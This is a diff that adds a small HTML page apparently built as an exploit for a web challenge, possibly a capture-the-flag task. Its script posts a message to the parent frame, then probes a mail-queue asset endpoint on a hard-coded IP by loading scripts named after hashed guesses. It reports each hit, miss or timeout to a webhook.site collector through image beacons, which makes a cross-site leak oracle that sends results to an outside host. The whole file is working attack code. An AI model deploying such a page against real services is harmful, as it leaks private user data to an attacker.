@@ -1,0 +1,44 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>notes</title>
+<script>
+const WEBHOOK = 'https://webhook.site/0ccc20de-a17a-4dda-bb53-cc35a0a56181/log';
+const u = new URL(location.href);
+const wid = u.searchParams.get('wid') || '';
+const rv = u.searchParams.get('rv') || '';
+const q = u.searchParams.get('g') || '';
+const base = u.searchParams.get('b') || 'http://16.184.15.39:18080';
+const bucket = 'notes';
+function log(msg) {
+  (new Image()).src = WEBHOOK + '?m=' + encodeURIComponent(msg)
+    + '&wid=' + encodeURIComponent(wid)
+    + '&rv=' + encodeURIComponent(rv)
+    + '&q=' + encodeURIComponent(q)
+    + '&href=' + encodeURIComponent(location.href)
+    + '&t=' + Date.now();
+}
+function fnv1a(s) {
+  let h = 0x811c9dc5;
+  for (let i = 0; i < s.length; i++) {
+    h ^= s.charCodeAt(i);
+    h = Math.imul(h, 0x01000193) >>> 0;
+  }
+  return ('00000000' + h.toString(16)).slice(-8);
+}
+if (!wid || !rv) {
+  log('frame');
+  try {
+    parent.postMessage({ type: 'relaydesk:resume-ready' }, '*');
+  } catch (e) {
+    log('posterr:' + e.message);
+  }
+} else {
+  const slot = fnv1a(wid + '|' + q + '|' + bucket + '|' + rv);
+  const s = document.createElement('script');
+  s.onload = () => log('hit');
+  s.onerror = () => log('miss');
+  s.src = base + '/mail/queue/assets/' + encodeURIComponent(wid) + '/' + slot + '.js?q=' + encodeURIComponent(q) + '&bucket=' + bucket + '&rv=' + encodeURIComponent(rv);
+  document.head.appendChild(s);
+  setTimeout(() => log('timeout'), 4000);
+}
+</script>
